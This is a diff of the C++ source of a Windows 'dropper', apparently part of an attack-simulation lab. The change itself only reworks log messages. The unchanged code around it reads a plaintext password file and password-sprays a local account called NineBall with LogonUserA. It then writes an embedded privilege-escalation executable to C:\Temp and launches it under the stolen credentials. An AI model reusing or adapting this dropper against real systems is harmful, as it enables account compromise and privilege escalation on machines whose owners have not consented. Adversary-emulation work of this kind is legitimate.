@@ -1,12 +1,15 @@
 #include "dropper.hpp"
 
+std::string componentName = "dropper";
+
 int wmain() {
-	Log("[+] Starting dropper.", "dropper");
+	Log("[+] Starting " + componentName + ".", componentName);
+	Log("[*] Running as " + UserRunningProcess(), componentName);
 
 	// TODO: simulate attacker looking for password docs with powershell
 
 	// read passwords in doc
-	Log("[+] Reading password doc.", "dropper");
+	Log("[+] Reading password doc.", componentName);
 	std::ifstream file;
 	file.open(L"C:\\Users\\NineBall\\Desktop\\notmypasswords.txt", std::ios::in);
 	std::vector<std::string> passList;
@@ -21,10 +24,10 @@ int wmain() {
 	file.close();
 
 	// attempt to authenticate as NineBall with passwords
-	Log("[+] Starting password spray.", "dropper");
+	Log("[+] Starting password spray.", componentName);
 	HANDLE hToken = NULL;
 	for (std::string s : passList) {
-		Log("  [*] Trying password \"" + s + "\"", "dropper");
+		Log("  [*] Trying password \"" + s + "\"", componentName);
 		if (LogonUserA(
 			"NineBall",
 			".",
@@ -39,19 +42,19 @@ int wmain() {
 	}
 
 	if (hToken == NULL || hToken == INVALID_HANDLE_VALUE) {
-		Log("[!] Failed to get NineBall token" + std::to_string(GetLastError()), "dropper");
+		Log("[!] Failed to get NineBall token" + std::to_string(GetLastError()), componentName);
 	}
 
-	Log("[*] Valid password: \"" + pass + "\"", "dropper");
+	Log("[*] Valid password: \"" + pass + "\"", componentName);
 
 	// write the privesc to disk
-	Log("[+] Writing privesc to disk.", "dropper");
+	Log("[+] Writing privesc to disk.", componentName);
 	std::ofstream outfile("C:\\Temp\\privesc.exe", std::ios::out | std::ios::binary);
 	outfile.write(&privesc[0], sizeof(privesc));
 	outfile.close();
 
 	// create privesc process as NineBall
-	Log("[+] Starting privesc.", "dropper");
+	Log("[+] Starting privesc.", componentName);
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	ZeroMemory(&si, sizeof(si));
@@ -78,10 +81,10 @@ int wmain() {
 		&si,
 		&pi
 	)) {
-		Log("[!] Failed to create privesc process." + std::to_string(GetLastError()), "dropper");
+		Log("[!] Failed to create privesc process." + std::to_string(GetLastError()), componentName);
 	}
 	else {
-		Log("[+] Successfully created privesc process.", "dropper");
+		Log("[+] Successfully created privesc process.", componentName);
 	}
 
 	// unsure if these will cause dropper to stay up
